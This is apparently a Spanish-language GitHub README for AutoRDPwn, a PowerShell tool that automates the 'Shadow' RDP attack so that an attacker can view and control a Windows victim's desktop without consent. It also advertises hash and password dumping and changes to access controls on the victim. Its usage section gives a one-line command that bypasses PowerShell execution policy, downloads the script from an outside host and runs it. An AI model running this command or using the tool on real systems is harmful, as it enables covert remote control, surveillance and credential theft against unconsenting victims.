![AutoRDPwn](https://user-images.githubusercontent.com/34335312/45109339-8b203580-b13f-11e8-9de7-1210114313bb.png)


**AutoRDPwn** es un script creado en Powershell y diseñado para automatizar el ataque **Shadow** en equipos Microsoft Windows. Esta vulnerabilidad permite a un atacante remoto visualizar el escritorio de su víctima sin su consentimiento, e incluso controlarlo a petición. Para su correcto funcionamiento, es necesario cumplir los requisitos que se describen en la guía de uso.


# Requisitos
Powershell 5.0 o superior


# Cambios

## Versión 4.6
• Nueva interfaz de usuario totalmente rediseñada

• Ejecución en memoria mejorada

• Ahora los binarios se descargan en base64 y se generan en local

• Modificación de las ACL de WMI y PSRemoting en la víctima

• Nuevo módulo disponible: Local Port Forwarding

• Nuevo módulo disponible: Powershell Web Server

*El resto de cambios se pueden consultar en el fichero CHANGELOG


# Uso
Esta aplicación puede usarse de forma local, remota o para pivotar entre equipos. 
Gracias a los módulos adicionales, es posible volcar hashes y contraseñas o incluso recuperar el histórico de conexiones RDP.

**Ejecución en una línea:**

powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"

**La guía detallada de uso se encuentra en el siguiente enlace:**

https://darkbyte.net/autordpwn-la-guia-definitiva


# Capturas de pantalla
![autordpwn_es1](https://user-images.githubusercontent.com/34335312/49990172-02563880-ff7d-11e8-8031-8ac6fef02107.png)
![autordpwn_es2](https://user-images.githubusercontent.com/34335312/49990175-02563880-ff7d-11e8-801a-849bba9dee76.png)







